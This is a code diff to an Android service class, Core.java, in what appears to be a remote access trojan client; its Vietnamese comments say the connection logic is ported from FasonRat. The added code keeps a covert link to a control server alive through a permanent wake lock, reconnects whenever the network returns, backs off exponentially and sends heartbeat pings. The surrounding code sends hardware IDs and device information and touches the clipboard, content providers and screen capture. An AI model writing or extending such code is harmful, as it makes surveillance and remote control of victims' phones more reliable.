@@ -8,6 +8,12 @@ import android.content.ClipboardManager;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkCapabilities;
+import android.net.NetworkRequest;
+import android.os.PowerManager;
+import android.content.pm.ServiceInfo;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -52,11 +58,73 @@ public class Core extends Service {
     private Socket socket;
     private Thread worker;
 
+    // ── ổn định kết nối (port logic từ SocketClient/MainService của FasonRat) ──
+    private static final int CONNECT_TIMEOUT_MS = 20000;
+    private static final int BACKOFF_MIN_MS = 5000;
+    private static final int BACKOFF_MAX_MS = 60000;
+    private static final int PING_EVERY_MS = 25000;
+    private static final int DEAD_AFTER_MS = 50000;
+
+    private PowerManager.WakeLock wakeLock;
+    private ConnectivityManager.NetworkCallback netCb;
+    static volatile boolean forceReconnect = false;
+    static volatile long lastPongAt = 0;
+    private int backoff = BACKOFF_MIN_MS;
+
     @Override public void onCreate() {
         super.onCreate();
         Cfg.load(this);
         proto = new Proto(Cfg.psk());
-        startForeground(1, buildNotification());
+        startForegroundSafe();
+        acquireWakeLock();
+        registerNetworkMonitor();
+    }
+
+    /** Android 12+ bắt buộc khai báo type khi startForeground; sai type sẽ throw → fallback. */
+    private void startForegroundSafe() {
+        Notification n = buildNotification();
+        try {
+            if (Build.VERSION.SDK_INT >= 29) {
+                startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+            } else {
+                startForeground(1, n);
+            }
+        } catch (Throwable t) {
+            Log.w(TAG, "startForeground type loi: " + t.getMessage());
+            try { startForeground(1, n); } catch (Throwable ignored) { }
+        }
+    }
+
+    private void acquireWakeLock() {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (pm == null) return;
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "zk:net");
+            wakeLock.setReferenceCounted(false);
+            wakeLock.acquire();
+        } catch (Throwable ignored) { }
+    }
+
+    /** Có mạng lại → kết nối ngay, không đợi backoff (giống onAvailable của FasonRat). */
+    private void registerNetworkMonitor() {
+        try {
+            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+            if (cm == null) return;
+            NetworkRequest req = new NetworkRequest.Builder()
+                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                    .build();
+            netCb = new ConnectivityManager.NetworkCallback() {
+                @Override public void onAvailable(Network network) {
+                    forceReconnect = true;
+                    status = "có mạng, kết nối lại…";
+                    try { if (socket != null) socket.close(); } catch (Throwable ignored) { }
+                }
+                @Override public void onLost(Network network) {
+                    status = "mất mạng";
+                }
+            };
+            cm.registerNetworkCallback(req, netCb);
+        } catch (Throwable ignored) { }
     }
 
     @Override public int onStartCommand(Intent intent, int flags, int startId) {
@@ -160,13 +228,19 @@ public class Core extends Service {
                 hello.put("hwid", hwid());
                 hello.put("info", info());
                 proto.write(socket.getOutputStream(), hello);
+                backoff = BACKOFF_MIN_MS;
                 status = "tcp ok, đang bắt tay…";
+                startHeartbeat();
                 Log.i(TAG, "connected " + Cfg.host() + ":" + Cfg.port());
 
                 while (running) {
                     JSONObject msg = proto.read(socket.getInputStream());
                     if (msg == null) break;
                     String t = msg.optString("t");
+                    if ("pong".equals(t)) {
+                        lastPongAt = System.currentTimeMillis();
+                        continue;
+                    }
                     if ("ping".equals(t)) {
                         JSONObject pong = new JSONObject();
                         pong.put("t", "pong");
@@ -205,8 +279,58 @@ public class Core extends Service {
                 socket = null;
             }
             if (status.startsWith("ONLINE")) status = "mất kết nối, đang thử lại…";
-            try { Thread.sleep(4000 + (int) (Math.random() * 3000)); } catch (InterruptedException ignored) { }
+            stopHeartbeat();
+            // backoff 5s -> 60s + jitter (giống reconnectionDelay 5s / delayMax 60s của FasonRat)
+            int wait = backoff;
+            backoff = Math.min(BACKOFF_MAX_MS, Math.max(BACKOFF_MIN_MS, backoff * 2));
+            wait += (int) (Math.random() * 2000);
+            status = status + " (thử lại sau " + (wait / 1000) + "s)";
+            long until = System.currentTimeMillis() + wait;
+            while (running && System.currentTimeMillis() < until) {
+                if (forceReconnect) { forceReconnect = false; break; }
+                try { Thread.sleep(300); } catch (InterruptedException ignored) { }
+            }
         }
+    }
+
+    // ─────────────── heartbeat ───────────────
+    private volatile boolean hbRunning = false;
+    private Thread hbThread;
+
+    private void startHeartbeat() {
+        if (hbRunning) return;
+        hbRunning = true;
+        lastPongAt = System.currentTimeMillis();
+        hbThread = new Thread(() -> {
+            while (hbRunning && running) {
+                try {
+                    Thread.sleep(PING_EVERY_MS);
+                    if (!hbRunning) break;
+                    Socket s = socket;
+                    if (s == null || !s.isConnected()) break;
+                    JSONObject ping = new JSONObject();
+                    ping.put("t", "ping");
+                    proto.write(s.getOutputStream(), ping);
+                    if (System.currentTimeMillis() - lastPongAt > DEAD_AFTER_MS) {
+                        status = "server không phản hồi, kết nối lại…";
+                        try { s.close(); } catch (Throwable ignored) { }
+                        break;
+                    }
+                } catch (Throwable t) {
+                    break;
+                }
+            }
+            hbRunning = false;
+        }, "zk-hb");
+        hbThread.setDaemon(true);
+        hbThread.start();
+    }
+
+    private void stopHeartbeat() {
+        hbRunning = false;
+        Thread t = hbThread;
+        hbThread = null;
+        if (t != null) { try { t.interrupt(); } catch (Throwable ignored) { } }
     }
 
     private String hwid() {
@@ -777,6 +901,12 @@ public class Core extends Service {
 
     @Override public void onDestroy() {
         running = false;
+        stopHeartbeat();
+        try { if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); } catch (Throwable ignored) { }
+        try {
+            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+            if (cm != null && netCb != null) cm.unregisterNetworkCallback(netCb);
+        } catch (Throwable ignored) { }
         Media.stopScreen();
         super.onDestroy();
     }
